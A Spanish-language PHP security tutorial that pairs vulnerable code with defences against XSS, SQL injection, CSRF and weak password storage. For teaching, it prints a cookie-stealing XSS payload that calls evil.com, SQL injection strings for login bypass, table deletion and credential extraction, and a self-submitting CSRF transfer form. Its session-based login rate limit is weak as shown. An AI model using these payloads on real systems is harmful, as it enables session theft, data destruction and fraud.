Seguridad en PHP

Las vulnerabilidades más comunes y cómo proteger tu aplicación.

1
XSS — Cross-Site Scripting
Inyección de código JavaScript malicioso en páginas web. La vulnerabilidad web más frecuente.
XSS ocurre cuando datos del usuario se muestran sin sanitizar en HTML. El atacante inyecta JavaScript que roba cookies, redirige o manipula la página.
TipoCómo funcionaEjemplo de ataque
ReflejadoEl script viene en la URL/formulario y se muestra de inmediato?q=<script>alert(1)</script>
AlmacenadoEl script se guarda en BD y se ejecuta para todos los visitantesComentario con <script> guardado
DOM-basedJavaScript manipula el DOM sin pasar por el servidordocument.write(location.hash)
xss_ejemplo.php
<?php
// ❌ VULNERABLE — muestra datos sin sanitizar
$nombre = $_GET['nombre'];
echo "<h1>Hola, $nombre</h1>";
// Ataque: ?nombre=<script>document.cookie</script>
// Roba las cookies del usuario → sesión comprometida

// ❌ También vulnerable en atributos HTML
echo "<input value='$nombre'";
// Ataque: ?nombre=' onmouseover='alert(1)
?>
▶ Payload XSS clásico
<script>fetch('https://evil.com?c='+document.cookie)</script>
← Envía las cookies al servidor del atacante
xss_defensa.php
<?php
// ✅ REGLA DE ORO: sanitizar SIEMPRE al mostrar, no al guardar

// 1. htmlspecialchars — convierte caracteres peligrosos
function e(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
echo "<h1>Hola, " . e($_GET['nombre']) . "</h1>";
// <script> se convierte en &lt;script&gt; → inofensivo

// 2. En atributos HTML — también escapar
echo '<input value="' . e($_GET['nombre']) . '">';

// 3. En JSON para JavaScript — json_encode escapa por defecto
$datos = ['nombre' => $_GET['nombre']];
echo '<script>var datos = ' . json_encode($datos) . ';</script>';

// 4. Cookies con HttpOnly — JS no puede acceder
setcookie('session', $token, [
    'httponly' => true,   // bloquea acceso desde JS
    'secure'   => true,   // solo por HTTPS
    'samesite' => 'Strict',
]);
?>
▶ Transformación htmlspecialchars
Input: <script>alert(1)</script>
Output: &lt;script&gt;alert(1)&lt;/script&gt; ← texto inofensivo
headers_seguridad.php
<?php
// Content Security Policy — controla qué scripts se pueden ejecutar
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");

// X-XSS-Protection — activa el filtro XSS del navegador (legado)
header("X-XSS-Protection: 1; mode=block");

// X-Content-Type-Options — evita MIME sniffing
header("X-Content-Type-Options: nosniff");

// X-Frame-Options — evita clickjacking (la página en iframes)
header("X-Frame-Options: DENY");

// Referrer-Policy — controla qué información se envía al navegar
header("Referrer-Policy: strict-origin-when-cross-origin");

// Strict-Transport-Security — fuerza HTTPS por 1 año
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");

// Función helper para aplicar todos los headers de una vez
function aplicarHeadersSeguridad(): void {
    $headers = [
        "Content-Security-Policy: default-src 'self'",
        "X-Content-Type-Options: nosniff",
        "X-Frame-Options: DENY",
        "Referrer-Policy: strict-origin-when-cross-origin",
        "Strict-Transport-Security: max-age=31536000",
    ];
    foreach ($headers as $h) header($h);
}
?>
Llama a aplicarHeadersSeguridad() al inicio de cada request, antes de enviar cualquier HTML. Colócalo en un archivo de configuración que se incluya en todos los archivos.
2
SQL Injection
Inyección de código SQL para leer, modificar o eliminar datos de la base de datos.
SQL Injection ocurre cuando datos del usuario se concatenan directamente en una consulta SQL. La defensa es usar siempre sentencias preparadas con PDO.
sqli_vulnerable.php
<?php
// ❌ VULNERABLE — concatenación directa
$user = $_POST['usuario'];
$pass = $_POST['password'];
$sql  = "SELECT * FROM usuarios WHERE usuario='$user' AND password='$pass'";

// ══ ATAQUES POSIBLES ══════════════════════════════════════

// 1. Bypass de login (entra sin contraseña)
// usuario = admin'-- 
// SQL resultante: ... WHERE usuario='admin'--' AND password='...'
// El -- comenta el resto → ignora la comprobación de password

// 2. Leer todos los usuarios
// id = 1 OR 1=1
// SQL: WHERE id = 1 OR 1=1  → devuelve TODAS las filas

// 3. Eliminar datos (DROP TABLE)
// id = 1; DROP TABLE usuarios;--
// SQL: WHERE id=1; DROP TABLE usuarios;-- (con multi-query)

// 4. Extraer datos de otras tablas (UNION)
// id = 0 UNION SELECT user,password,3,4 FROM mysql.user--
?>
▶ Impacto de SQL Injection
Login sin contraseña (bypass)
Lectura de toda la base de datos
Eliminación de tablas completas
Robo de credenciales de admin de MySQL
sqli_defensa.php
<?php
// ✅ SENTENCIAS PREPARADAS — PDO separa SQL de datos

// Login seguro
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE usuario = :user LIMIT 1");
$stmt->execute([':user' => $_POST['usuario']]);
$usuario = $stmt->fetch();

if ($usuario && password_verify($_POST['password'], $usuario['password_hash'])) {
    echo "✅ Login correcto";
}

// Parámetros posicionales (?) — alternativa a :nombre
$stmt = $pdo->prepare("SELECT * FROM productos WHERE categoria = ? AND precio < ?");
$stmt->execute([$_GET['cat'], $_GET['max_precio']]);

// Columnas y tablas dinámicas — NO se pueden parametrizar
// Para éstas usar allowlist explícita
$columnasValidas = ['nombre', 'precio', 'fecha'];
$orden = $_GET['orden'] ?? 'nombre';

if (!in_array($orden, $columnasValidas, true)) {
    die("Columna no válida");
}
// Ahora sí es seguro interpolarlo en el SQL
$sql = "SELECT * FROM productos ORDER BY $orden";
?>
▶ Por qué las sentencias preparadas son seguras
El SQL y los datos viajan SEPARADOS al motor de BD
El motor trata los parámetros SIEMPRE como datos, nunca como código
admin'-- se almacena como texto literal, no como SQL
capas_defensa.php
<?php
// Defensa en profundidad — múltiples capas

// 1. Validar tipos antes de usar
$id    = filter_var($_GET['id'], FILTER_VALIDATE_INT);
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
if ($id === false)    die("ID inválido");
if ($email === false) die("Email inválido");

// 2. Principio de mínimo privilegio en BD
// El usuario de BD de la app NO debe tener DROP, CREATE, GRANT
// Solo SELECT, INSERT, UPDATE, DELETE en las tablas necesarias
// GRANT SELECT, INSERT ON tienda.* TO 'app_user'@'localhost';

// 3. PDO con manejo de errores silencioso en producción
$pdo = new PDO($dsn, $user, $pass, [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,  // sentencias preparadas reales
]);

// 4. Ocultar errores de BD al usuario
try {
    $stmt = $pdo->prepare("SELECT * FROM productos WHERE id = :id");
    $stmt->execute([':id' => $id]);
} catch (PDOException $e) {
    error_log($e->getMessage());   // registrar internamente
    die("Error al procesar la solicitud");  // mensaje genérico al usuario
}
?>
Las sentencias preparadas son la defensa principal. Combínalas con: validación de entrada, mínimo privilegio en BD, errores silenciosos en producción y logs internos.
3
Hash de Contraseñas
Nunca almacenes contraseñas en texto plano ni con MD5/SHA1. Usa password_hash().
MétodoSeguridad¿Usar?Razón
Texto plano Nula NuncaCualquiera que acceda a la BD ve la contraseña
MD5 / SHA1 Muy baja NuncaTablas rainbow, sin salt, demasiado rápido
SHA256 manual Baja NoSin factor de trabajo adaptativo
password_hash() bcrypt Alta SíSalt automático, lento por diseño, adaptativo
password_hash() Argon2id Muy alta SíResistente a GPU y side-channel attacks
password_hash.php
<?php
// ✅ Al REGISTRAR — crear hash seguro
$password = $_POST['password'];
$hash     = password_hash($password, PASSWORD_DEFAULT);
// Guardar $hash en la BD — NUNCA $password

echo $hash;
// $2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
// └─ $2y$ = bcrypt  $10$ = cost factor  resto = salt+hash

// ✅ Al HACER LOGIN — verificar hash
$hashBD = '$2y$10$...';  // recuperado de la BD
if (password_verify($password, $hashBD)) {
    echo "✅ Acceso permitido";
} else {
    echo "❌ Contraseña incorrecta";
}

// ✅ Rehashing — actualizar si el algoritmo mejora
if (password_verify($password, $hashBD)
    && password_needs_rehash($hashBD, PASSWORD_DEFAULT)) {
    $nuevoHash = password_hash($password, PASSWORD_DEFAULT);
    // UPDATE usuarios SET password_hash = ? WHERE id = ?
}
?>
▶ Mismo password → hashes distintos (salt aleatorio)
password_hash("mipass") → $2y$10$abc123...XYZ
password_hash("mipass") → $2y$10$def456...ABC ← diferente
password_verify("mipass", cualquiera de los dos) → true
argon2.php
<?php
// bcrypt con cost factor personalizado (por defecto 10)
// Mayor cost = más lento pero más seguro
$hash = password_hash($password, PASSWORD_BCRYPT, [
    'cost' => 12  // recomendado para servidores modernos
]);

// Argon2id — más seguro que bcrypt (PHP 7.3+)
if (defined('PASSWORD_ARGON2ID')) {
    $hash = password_hash($password, PASSWORD_ARGON2ID, [
        'memory_cost' => 65536,  // 64 MB de RAM
        'time_cost'   => 4,      // iteraciones
        'threads'     => 3,      // hilos paralelos
    ]);
}

// Elegir el mejor disponible automáticamente
$algoritmo = defined('PASSWORD_ARGON2ID') ? PASSWORD_ARGON2ID : PASSWORD_DEFAULT;
$hash      = password_hash($password, $algoritmo);

// Benchmarking — encontrar el cost factor adecuado para tu servidor
$target = 0.1;  // objetivo: 100ms por hash
$cost   = 8;
do {
    $cost++;
    $inicio = microtime(true);
    password_hash("test", PASSWORD_BCRYPT, ['cost' => $cost]);
} while (microtime(true) - $inicio < $target);
echo "Cost óptimo para este servidor: $cost";
?>
Flujo completo de contraseñas
REGISTRO:   $_POST['password'] → validar longitud/complejidad → password_hash() → guardar hash en BD
LOGIN:       $_POST['password'] + hash de BD → password_verify() → true/false
REHASH:     Tras login exitoso → password_needs_rehash() → actualizar si es true
CAMBIO:     Verificar contraseña actual → validar nueva → password_hash() → actualizar BD
OLVIDO:     Email con token único de 1 uso → validar token → nueva contraseña → invalidar token
Nunca envíes la contraseña por email (ni en "recordatorio"). Envía un token de restablecimiento de un solo uso con expiración (15-60 minutos).
4
CSRF — Cross-Site Request Forgery
Ataque que fuerza al usuario autenticado a ejecutar acciones no deseadas en tu app.
CSRF explota que el navegador envía automáticamente las cookies de sesión. El atacante engaña al usuario para que haga una petición a tu app desde otro sitio.
Escenario de ataque CSRF
1. Usuario inicia sesión en banco.com → cookie de sesión guardada
2. Usuario visita evil.com (sitio malicioso del atacante)
3. evil.com tiene: <img src="banco.com/transferir?monto=1000&a=atacante">
4. El navegador hace la petición a banco.com con la cookie de sesión
5. banco.com procesa la transferencia creyendo que es el usuario
6. El atacante recibe el dinero
evil.html — código del atacante
<!-- Formulario invisible que se autoenvía -->
<form action="https://banco.com/transferir" method="POST" id="f">
  <input name="monto"     value="5000"       type="hidden">
  <input name="destinatario" value="atacante"  type="hidden">
</form>
<script>document.getElementById('f').submit();</script>
csrf_token.php
<?php
session_start();

// Generar token único por sesión
function csrfToken(): string {
    if (empty($_SESSION['csrf'])) {
        $_SESSION['csrf'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf'];
}

// Verificar token — usar hash_equals (timing-safe)
function verificarCsrf(): void {
    $tokenSesion = $_SESSION['csrf'] ?? '';
    $tokenPost   = $_POST['_token']  ?? '';
    if (!hash_equals($tokenSesion, $tokenPost)) {
        http_response_code(403);
        die("❌ Petición no válida (CSRF)");
    }
}

// En el controlador POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verificarCsrf();  // verificar ANTES de procesar
    // ... procesar la acción
}
?>

<!-- En el formulario HTML -->
<form method="POST" action="/transferir">
  <input type="hidden" name="_token" value="<?= csrfToken() ?>">
  <input type="number" name="monto">
  <button>Transferir</button>
</form>
▶ Por qué funciona
El token es secreto y único por sesión
evil.com no puede leer el token (política same-origin)
Sin el token correcto → petición rechazada
samesite_cookies.php
<?php
// SameSite=Strict — la cookie NO se envía en peticiones cross-site
// Es la defensa más efectiva contra CSRF
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'domain'   => '',
    'secure'   => true,    // solo HTTPS
    'httponly' => true,    // JS no puede acceder
    'samesite' => 'Strict' // no se envía en cross-site
]);
session_start();

// SameSite valores:
// Strict → nunca en cross-site (máxima protección, puede romper flujos OAuth)
// Lax    → no en POST cross-site, sí en GET navegación normal
// None   → siempre (requiere Secure=true)
?>

Token CSRFVerifica que la petición viene de tu propio formulario Alto
SameSite=StrictEl navegador no envía cookies en peticiones cross-site Muy alto
Verificar Origin/RefererComprobar cabecera HTTP de origen de la petición Medio
Doble submit cookieToken en cookie + formulario, comparar ambos Alto
5
Buenas prácticas generales de seguridad
Validación de entrada · headers HTTP · HTTPS · datos sensibles · principio de mínimo privilegio.
seguridad_general.php
<?php
// ── 1. NUNCA confíes en datos del usuario ──────────────────
// Valida + Sanitiza + Escapa — en ese orden
$edad = filter_input(INPUT_POST, 'edad', FILTER_VALIDATE_INT,
    ['options' => ['min_range' => 0, 'max_range' => 120]]
);

// ── 2. Ocultar información del servidor ────────────────────
header_remove('X-Powered-By');           // quita "PHP/8.x"
ini_set('expose_php', 'Off');            // en php.ini también

// ── 3. Regenerar ID de sesión tras login ───────────────────
if ($loginExitoso) {
    session_regenerate_id(true);         // previene session fixation
    $_SESSION['usuario_id'] = $usuario['id'];
}

// ── 4. Variables de entorno para datos sensibles ───────────
$dbPass    = getenv('DB_PASSWORD');      // desde .env
$apiKey    = getenv('STRIPE_SECRET');
// NUNCA en el código ni en Git

// ── 5. Control de velocidad — limitar intentos de login ────
function verificarRateLimit(string $ip): void {
    $key      = "login_intentos_$ip";
    $intentos = $_SESSION[$key] ?? 0;
    if ($intentos >= 5) {
        http_response_code(429);
        die("Demasiados intentos. Espera 15 minutos.");
    }
    $_SESSION[$key] = $intentos + 1;
}

// ── 6. Tiempo de respuesta constante — evitar timing attacks
// Usar hash_equals() para comparar tokens/hashes
// Usar password_verify() para contraseñas (ya es timing-safe)
hash_equals($tokenBD, $tokenUsuario);  // ✅ timing-safe
$tokenBD === $tokenUsuario;            // ❌ NO timing-safe
?>
▶ Checklist de seguridad PHP
Usar sentencias preparadas (nunca concatenar SQL)
htmlspecialchars() en toda salida HTML
password_hash() / password_verify() para contraseñas
Token CSRF en todos los formularios POST
Cookies HttpOnly + Secure + SameSite=Strict
session_regenerate_id() tras login
Datos sensibles en variables de entorno
Headers de seguridad HTTP
Mostrar errores genéricos al usuario, detalles solo en logs
